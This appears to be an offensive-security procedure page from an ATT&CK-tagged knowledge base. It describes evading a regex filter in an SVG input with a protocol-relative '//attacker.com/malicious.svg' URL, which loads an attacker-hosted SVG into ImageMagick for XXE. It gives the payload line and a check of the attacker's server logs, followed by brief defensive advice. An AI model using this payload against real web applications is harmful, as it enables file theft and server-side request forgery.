---
id: proc-uuid-2
tags:
  - bypass
  - regex
  - ssrf
type: procedure
tools:
  - '[[tools/ImageMagick]]'
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:26:27.542Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Bypass-Regex-Filter-with-Double-Forward-Slashes

## Summary

This procedure bypasses a regex-based filter in the SVG input field to allow loading of external malicious SVG files, enabling XXE exploitation in ImageMagick.

## Description

The emblem editor filters SVG inputs to prevent external resource loading, but a flaw allows double forward slashes (//) to mimic SMB paths and evade the regex. This loads the attacker's SVG into ImageMagick, triggering XXE. Targeted at web apps using vulnerable ImageMagick; requires knowledge of the filter pattern. Successful bypass leads to external entity processing and data exfiltration via rendered PNG.

## Requirements

1. Knowledge of the target filter (e.g., blocks http:// but not //)
2. Hosted malicious SVG from prior procedure
3. Access to the emblem editor input

## Defense

Defensive measures and detection strategies:

- Implement strict URL validation beyond regex (e.g., parse and whitelist schemes)
- Log and alert on unusual path patterns like // in inputs
- Use sandboxed image processing to restrict network access

## Objectives

1. Load external SVG despite filters
2. Initiate XXE payload execution
3. Enable subsequent LFI/SSRF

## Instructions

### Step 1: Craft Bypass Payload

**Context**: Use double slashes to reference the external SVG in a fill attribute.

No command; manually construct:
```xml
<rect fill="url(//attacker.com/malicious.svg#exploit)" width="100" height="100"/>
```

> The //attacker.com bypasses regex expecting http:// or file://. Insert into the emblem editor's SVG input.

### Step 2: Submit and Verify

**Context**: Test if the external resource loads without rejection.

Monitor attacker server logs for fetch requests from the target.

**Expected Output**: HTTP GET to /malicious.svg from target IP.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/ImageMagick]]

## Tags

- bypass
- regex
- svg
